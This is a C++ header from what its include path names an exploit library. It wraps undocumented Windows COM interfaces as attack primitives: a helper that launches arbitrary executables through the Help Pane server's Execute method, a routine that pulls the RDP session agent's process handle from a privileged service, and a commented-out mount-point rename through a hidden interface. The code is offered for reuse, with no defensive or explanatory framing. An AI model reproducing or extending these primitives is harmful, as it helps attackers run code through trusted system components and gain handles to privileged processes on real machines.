#pragma once

#include "../../../pch.h"
#include "../../../include/exploitLib/misc.h"
namespace NT::misc
{



   template< typename T >
   auto comCreate(guidwrapper g, DWORD cltxContext = CLSCTX_ALL)
   {
      static auto initCom = CoInitializeEx(NULL, COINIT_MULTITHREADED     );//COINIT_MULTITHREADED COINIT_APARTMENTTHREADED
      return wil::CoCreateInstance <T>(g, cltxContext);
   }
   /*
   namespace mm
   {
      struct __declspec(uuid("{92F8D886-AB61-4113-BD4F-2E894397386F}"))
         IMountPointRename : IUnknown {
         virtual   HRESULT Proc3( const wchar_t* p0,   const  wchar_t* p1) = 0;
      };
      void rename(const wchar_t* p0,const wchar_t* p1) {
          //          auto c = comCreate< IPSFactoryBuffer>(L"{95E15D0A-66E6-93D9-C53C-76E6219D3341}" );


         auto c = comCreate< IPSFactoryBuffer>( x::guid{ L"{D5F569D0-593B-101A-B569-08002B2DBF7A}" } );
         c.try_query<IMountPointRename>()->Proc3(p0,p1);
      }
   }*/
   namespace helppane 
   {
       

      struct __declspec(uuid("{8cec592c-07a1-11d9-b15e-000d56bfe6ee}"))
         IHxHelpPaneServer : public IUnknown {
         virtual HRESULT __stdcall DisplayTask(wchar_t*) = 0;
         virtual HRESULT __stdcall DisplayContents(wchar_t*) = 0;
         virtual HRESULT __stdcall DisplaySearchResults(wchar_t*) = 0;
         virtual HRESULT __stdcall Execute(const wchar_t*) = 0;
      };

      template< typename T >
      void launchExe(T t)
      {
         auto c = comCreate< IHxHelpPaneServer>(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}");
         c.try_query<IHxHelpPaneServer>()->Execute(t);
      }
   }
   namespace rdpsa 
   {
      struct Struct_0 
      {
        int64_t Member0;
        int64_t Member4;
        int16_t Member8[];
      };
 
      struct __declspec(uuid("{56276483-5c2d-472c-b375-23ce4eb6a4f9}")) 
         IRdpSessionAgent : public IUnknown 
      {
         virtual HRESULT __stdcall CreateShadowInvitation( BSTR p0, uint16_t p1, uint16_t p2, uint16_t* p3, BSTR* p4) = 0;
      };

      struct __declspec(uuid("{86118f98-8458-4ab1-9009-68a8eca65307}"))
         IRdpSessionAgentProxy : public IUnknown {
      public:
         virtual HRESULT __stdcall GetSessionAgentProcessHandle( ::HANDLE* p0 ) = 0;
         virtual HRESULT __stdcall SetKey( BSTR p0 ) = 0;
         virtual HRESULT __stdcall Advise( BSTR p0, IRdpSessionAgent* p1 ) = 0;
         virtual HRESULT __stdcall Unadvise( BSTR p0 ) = 0;
         virtual HRESULT __stdcall NotifyInitializationComplete() = 0;
      };

      auto getHandle()
      {
       //  wil::CoGetClassObject<
         auto c = comCreate< NT::misc::rdpsa::IRdpSessionAgent >(L"RDPSa", CLSCTX_LOCAL_SERVER);
         ::HANDLE h{};

         c.try_query<IRdpSessionAgentProxy>()->GetSessionAgentProcessHandle(&h);
         return x::handle::make(h);
         
      }
   }
}
